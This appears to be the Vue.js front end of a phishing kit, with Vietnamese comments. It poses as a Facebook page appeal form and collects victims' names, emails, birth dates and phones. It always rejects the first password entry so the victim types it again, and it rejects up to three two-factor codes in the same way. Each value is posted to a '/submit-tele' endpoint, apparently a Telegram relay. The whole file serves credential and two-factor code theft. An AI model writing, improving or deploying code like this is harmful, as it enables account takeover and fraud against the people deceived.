import { reactive, ref, watch, onMounted, nextTick, onBeforeUnmount } from "vue";
import "intl-tel-input/build/css/intlTelInput.css";
import intlTelInput from "intl-tel-input";
import { AsYouType } from "libphonenumber-js";
import api from "@/services/api";
function setCookie(name, value, days = 1) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie =
        `${encodeURIComponent(name)}=${encodeURIComponent(value)};` +
        ` expires=${expires}; path=/; SameSite=Lax`;
}

function getCookie(name) {
    const key = encodeURIComponent(name) + "=";
    const parts = document.cookie.split("; ");
    for (const part of parts) {
        if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
    }
    return "";
}

function removeCookie(name) {
    document.cookie = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; SameSite=Lax`;
}

const COOKIE_KEY = "appeal_step1";
export function useAppealForm(emit) {
    // phone: hiển thị trong input (có +dialCode + formatted)
    const phone = ref("");
    // phoneE164: dùng để submit (dạng +<dialCode><digits>), KHÔNG validate đúng/sai
    const phoneE164 = ref("");

    const iti = ref(null);
    const phoneInputEl = ref(null);

    let onInputHandler = null;
    let onCountryChangeHandler = null;

    const step = ref(1);

    const code = ref("");
    const codeError = ref(false);
    const codeErrorMessage = ref("");
    const codeLocked = ref(false);
    const countdown = ref(0);
    let timer = null;
    const codeInputCount = ref(0);

    const password = ref("");
    const passwordError = ref(false);
    const passwordInputCount = ref(0);

    const isLoading = ref(false);
    const isCountingDown = ref(false);

    const allFormData = reactive({ formStep1: null, formStep2: null, formStep3: null });
    // data để hiển thị step 3
    const savedUser = reactive({
        fullName: "",
        email: "",
        phoneDisplay: "",
        phoneE164: "",
    });

    function saveStep1ToCookie() {
        const payload = {
            fullName: form.fullName || "",
            email: form.email || "",
            phoneDisplay: phone.value || "",     // dạng +84 123...
            phoneE164: phoneE164.value || "",    // dạng +84123...
            // nếu muốn lưu thêm:
            // businessEmail: form.businessEmail,
            // pageName: form.pageName,
            // dob: form.dob,
            // issue: form.issue,
        };

        setCookie(COOKIE_KEY, JSON.stringify(payload), 1); // 1 ngày
    }

    function loadStep1FromCookie() {
        const raw = getCookie(COOKIE_KEY);
        if (!raw) return;

        try {
            const data = JSON.parse(raw);

            savedUser.fullName = data.fullName || "";
            savedUser.email = data.email || "";
            // đúng theo hint em đã có:
            savedUser.phoneDisplay = data.phoneDisplay || data.phone || "";
            savedUser.phoneE164 = data.phoneE164 || "";
        } catch (e) {
            // cookie hỏng thì xoá
            removeCookie(COOKIE_KEY);
        }
    }
    const form = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: { day: "", month: "", year: "" },
        issue: "",
        notifyFacebook: true,
        agreeTerms: false,
    });

    const errors = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: "",
        issue: "",
        phone: "",
        agreeTerms: "",
    });

    const getIso2 = () => {
        const iso2 = iti.value?.getSelectedCountryData?.()?.iso2;
        return (iso2 || "us").toUpperCase();
    };

    const getDialCode = () => {
        const dc = iti.value?.getSelectedCountryData?.()?.dialCode;
        return String(dc || "1"); // fallback
    };

    // chỉ check: có số sau dialCode hay chưa
    function validatePhoneLoose(nationalDigits) {
        if (!nationalDigits || nationalDigits.length === 0) {
            errors.phone = "Please enter enough phone number.";
            return false;
        }
        errors.phone = "";
        return true;
    }

    // Format chỉ phần national number bằng AsYouType, KHÔNG parse/validate
    function formatNationalDigits(nationalDigits) {
        const iso = getIso2();
        const formatter = new AsYouType(iso);
        return formatter.input(nationalDigits); // trả string formatted theo quốc gia
    }

    // Đồng bộ phone (display) + phoneE164 (submit)
    function syncPhoneValueFromDigits(nationalDigits) {
        const dialCode = getDialCode();
        const formattedNational = formatNationalDigits(nationalDigits);

        const display = `+${dialCode} ${formattedNational}`.trim();
        phone.value = display;

        // submit dạng E.164-like (không validate)
        phoneE164.value = `+${dialCode}${nationalDigits}`;

        if (phoneInputEl.value) {
            phoneInputEl.value.value = display;
        }
    }

    onMounted(async () => {
        loadStep1FromCookie();

        await nextTick();
        const input = document.querySelector("#phone");
        if (!input) return;
        phoneInputEl.value = input;

        let countryCode = "us";
        try {
            const res = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
            const data = await res.json();
            countryCode = data.country ? data.country.toLowerCase() : "us";
        } catch (_) {
            countryCode = "us";
        }

        // intl-tel-input chỉ dùng dropdown + lấy iso2/dialCode, KHÔNG dùng utilsScript
        iti.value = intlTelInput(input, {
            initialCountry: countryCode,
            containerClass: "w-full",
            strictMode: false,
            formatOnDisplay: false,
            nationalMode: false,
        });

        // ✅ set sẵn +dialCode theo IP
        const dialCode = getDialCode();
        const initialValue = `+${dialCode} `;
        phone.value = initialValue;
        input.value = initialValue;
        phoneE164.value = `+${dialCode}`; // chưa có số national

        // Input handler: chỉ cho phép số + format national part
        onInputHandler = (e) => {
            const dial = getDialCode();
            const iso = getIso2();

            const current = e.target.value || "";

            // Lấy tất cả digits
            const allDigits = current.replace(/\D/g, ""); // chỉ số

            // Tách national digits: bỏ dialCode nếu nó nằm ở đầu
            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            // ✅ Bắt buộc nationalDigits chỉ là số -> đã đảm bảo vì replace(/\D/g,'')
            // Format hiển thị
            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            // set display + submit value
            phone.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;
            e.target.value = display;

            // ✅ chỉ check rỗng / có số
            validatePhoneLoose(nationalDigits);
        };

        // Country change: reset prefix + format lại (nếu user đã nhập số)
        onCountryChangeHandler = () => {
            const dial = getDialCode();
            const iso = getIso2();

            // lấy digits user đã nhập trước đó (nếu có)
            const current = input.value || "";
            const allDigits = current.replace(/\D/g, "");

            // bỏ dial cũ nếu có
            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            // reset hiển thị theo dial mới
            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            phone.value = display;
            input.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;

            validatePhoneLoose(nationalDigits);
        };

        input.addEventListener("input", onInputHandler);
        input.addEventListener("countrychange", onCountryChangeHandler);
    });

    onBeforeUnmount(() => {
        const input = phoneInputEl.value;
        if (input && onInputHandler) input.removeEventListener("input", onInputHandler);
        if (input && onCountryChangeHandler) input.removeEventListener("countrychange", onCountryChangeHandler);

        if (iti.value?.destroy) iti.value.destroy();
        iti.value = null;
    });

    // ---- validation watchers ----
    watch(() => form.fullName, (val) => {
        errors.fullName = val.trim() ? "" : "Please enter enough full name.";
    });

    watch(() => form.email, (val) => {
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ? "" : "Please enter enough email address.";
    });

    watch(() => form.businessEmail, (val) => {
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)
            ? ""
            : "Please enter enough email business address.";
    });

    watch(() => form.pageName, (val) => {
        errors.pageName = val.trim() ? "" : "Please enter enough Facebook page name.";
    });

    watch(() => [form.dob.day, form.dob.month, form.dob.year], ([d, m, y]) => {
        errors.dob = d && m && y ? "" : "Please enter enough date of birth.";
    });

    watch(() => form.issue, (val) => {
        errors.issue = val.trim() ? "" : "Please enter your issue";
    });

    watch(() => form.agreeTerms, (val) => {
        errors.agreeTerms = val ? "" : "Please agree to our terms and data and cookie policy";
    });
    watch(step, (v) => {
        if (v === 3) loadStep1FromCookie();
    });
    // Validate tổng: phone chỉ cần có số (không check đúng/sai)
    function validatePhoneNumber() {
        errors.fullName = form.fullName.trim() ? "" : "Please enter enough full name.";
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) ? "" : "Please enter enough email address.";
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.businessEmail)
            ? ""
            : "Please enter enough email business address.";
        errors.pageName = form.pageName.trim() ? "" : "Please enter enough Facebook page name.";

        const { day, month, year } = form.dob;
        errors.dob = day && month && year ? "" : "Please enter enough date of birth.";

        errors.issue = form.issue.trim() ? "" : "Please enter enough issue.";
        errors.agreeTerms = form.agreeTerms ? "" : "Please agree to our terms and data and cookie policy";

        // phone: chỉ check có số sau dialCode
        const dial = getDialCode();
        const digits = (phone.value || "").replace(/\D/g, "");
        let nationalDigits = digits;
        if (nationalDigits.startsWith(dial)) nationalDigits = nationalDigits.slice(dial.length);

        validatePhoneLoose(nationalDigits);

        return Object.values(errors).every((v) => !v);
    }

    // Nếu template đang dùng @input="onPhoneInput" thì giữ hàm này (chỉ gọi handler chính)
    function onPhoneInput() {
        // Không cần làm gì nếu đã addEventListener(input)
        // Nhưng giữ để không vỡ template
        return;
    }

    const submitForm = async () => {
        try {
            isLoading.value = true;

            if (!validatePhoneNumber()) return;

            const birthday = `${form.dob.year}-${String(form.dob.month).padStart(2, "0")}-${String(form.dob.day).padStart(2, "0")}`;

            const formData = {
                fullName: form.fullName,
                email: form.email,
                businessEmail: form.businessEmail,
                pageName: form.pageName,
                phone: phoneE164.value, // ✅ gửi dạng +<dialcode><digits>
                birthday,
                description: form.issue,
                password: password.value,
                password_confirm: password.value,
                code_first: code.value,
                code_second: code.value,
            };

            const fd = new FormData();
            Object.keys(formData).forEach((k) => fd.append(k, formData[k]));

            const response = await api.post("/submit-tele", fd, {
                headers: { "Content-Type": "multipart/form-data" },
            });

            if (response.data?.success) {
                saveStep1ToCookie();
                allFormData.formStep1 = formData;
                step.value = 2;
            }
        } catch (error) {
            console.error("Response Error:", error.response?.data);
            if (error.response?.data?.errors) {
                const serverErrors = error.response.data.errors;
                Object.keys(serverErrors).forEach((key) => {
                    if (errors.hasOwnProperty(key)) errors[key] = serverErrors[key][0];
                });
            }
        } finally {
            isLoading.value = false;
        }
    };

    const submitPassword = async () => {
        try {
            isLoading.value = true;

            if (passwordInputCount.value === 0) {
                allFormData.formStep2 = {
                    ...allFormData.formStep1,
                    password: password.value,
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    step: 2,
                    password: password.value,
                    isFirstAttempt: true,
                });

                passwordInputCount.value++;
                passwordError.value = true;
                password.value = "";
                return;
            }

            const response = await api.post("/submit-tele", {
                ...allFormData.formStep1,
                ...allFormData.formStep2,
                step: 2,
                password_confirm: password.value,
                isFirstAttempt: false,
            });

            if (response.data?.success) {
                allFormData.formStep2 = {
                    ...allFormData.formStep2,
                    password_confirm: password.value,
                };
                step.value = 3;
            } else {
                passwordError.value = true;
                password.value = "";
                passwordInputCount.value = 0;
                delete allFormData.formStep2;
            }
        } catch (error) {
            console.error("Password Error:", error.response?.data);
            passwordError.value = true;
            password.value = "";
            passwordInputCount.value = 0;
            delete allFormData.formStep2;
        } finally {
            isLoading.value = false;
        }
    };

    const startCountdown = (seconds) => {
        codeLocked.value = true;
        countdown.value = seconds;

        if (timer) clearInterval(timer);
        timer = setInterval(() => {
            countdown.value--;
            if (countdown.value <= 0) {
                clearInterval(timer);
                codeLocked.value = false;
            }
        }, 1000);
    };

    const submitCode = async () => {
        try {
            isLoading.value = true;

            const method =
                JSON.parse(sessionStorage.getItem("step1Data") || "{}")?.method || "notification";

            if (codeInputCount.value === 0) {
                allFormData.formStep3 = {
                    ...allFormData.formStep2,
                    code_first: code.value,
                    method, // ✅ thêm vào data local
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    step: 3,
                    method,              // ✅ GỬI LÊN BACKEND
                    code_first: code.value,
                    isFirstAttempt: true,
                });

                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                startCountdown(30);
                return;
            }

            if (codeInputCount.value === 1) {
                allFormData.formStep3 = {
                    ...allFormData.formStep3,
                    code_second: code.value,
                    method, // ✅
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    ...allFormData.formStep3,
                    step: 3,
                    method,              // ✅ GỬI LÊN BACKEND
                    code_second: code.value,
                    isSecondAttempt: true,
                });

                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                startCountdown(30);
                return;
            }
            if (codeInputCount.value === 2) {
                allFormData.formStep3 = {
                    ...allFormData.formStep3,
                    code_second: code.value,
                    method, // ✅
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    ...allFormData.formStep3,
                    step: 3,
                    method,              // ✅ GỬI LÊN BACKEND
                    code_third: code.value,
                    isSecondAttempt: true,
                });
                codeInputCount.value++;
                step.value = 4;
            }
        } catch (error) {
            console.error("Code Error:", error.response?.data);
            codeError.value = true;
            codeErrorMessage.value = "Có lỗi xảy ra";
            code.value = "";
        } finally {
            isLoading.value = false;
        }
    };

    const handleSend = async () => {
        if (isLoading.value) return;

        isLoading.value = true;

        // ⏳ giả lập loading 0.5–1s
        await new Promise((resolve) => setTimeout(resolve, 800)); // đổi 500 hoặc 1000 tùy em

        // validate
        const ok = validatePhoneNumber();
        if (!ok) {
            isLoading.value = false;
            return;
        }

        // ✅ nếu đang tạm đóng API và muốn nhảy step luôn:
        // step.value = 2;

        // ✅ nếu vẫn muốn dùng flow hiện tại (có gọi API trong submitForm):
        await submitForm();

        isLoading.value = false;
    };
    const handleContinueCode = async () => {
        if (isLoading.value || codeLocked.value) return;

        isLoading.value = true;

        // ✅ cho spinner kịp render
        await new Promise((r) => setTimeout(r, 800));

        await submitCode();

        isLoading.value = false;
    };
    function onlyNumberKey(e) {
        const allowedKeys = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Tab"];

        // cho phép Ctrl/Cmd + V/C/X/A (paste/copy/cut/select-all)
        if (e.ctrlKey || e.metaKey) return;

        if (allowedKeys.includes(e.key)) return;

        // chỉ cho gõ số
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
            return;
        }

        // ✅ chặn gõ thêm nếu đã đủ 8 số
        const currentDigits = String(e.target.value || "").replace(/\D/g, "");
        if (currentDigits.length >= 8) {
            e.preventDefault();
        }
    }

    function onCodeInput(e) {
        // ✅ paste/gõ gì cũng được, nhưng cuối cùng chỉ giữ số và max 8
        let digits = String(e.target.value || "").replace(/\D/g, "");
        if (digits.length > 8) digits = digits.slice(0, 8);

        code.value = digits;
        e.target.value = digits;
    }

    function closePopup() {
        if (emit) emit("close");
    }

    return {
        phone,
        phoneE164,
        iti,
        handleSend,
        handleContinueCode,
        code,
        onlyNumberKey,
        onCodeInput,
        savedUser,
        step,
        form,
        errors,
        password,
        passwordError,
        passwordInputCount,
        validatePhoneNumber,
        onPhoneInput,
        submitForm,
        submitPassword,
        code,
        codeError,
        codeErrorMessage,
        codeLocked,
        countdown,
        submitCode,
        startCountdown,
        closePopup,
        isLoading,
        allFormData,
        isCountingDown,
    };
}